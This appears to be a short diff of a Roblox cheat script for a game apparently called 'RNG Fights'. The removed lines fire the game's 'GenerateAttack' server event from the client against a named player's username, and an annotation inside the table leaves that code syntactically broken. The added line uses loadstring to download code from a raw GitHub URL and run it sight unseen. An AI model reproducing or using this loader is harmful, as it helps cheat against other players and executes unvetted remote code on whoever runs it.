@@ -1,7 +1,1 @@
-local args = {
-    [1] = "Shockwave",
-    [2] = 12,
-    [3] = "ppp7074" => user name
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("EventsFolder"):WaitForChild("GenerateAttack"):FireServer(unpack(args))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/unknow6492BotOwner/unknow6492BotOwner/main/RNG%20Fights"))()
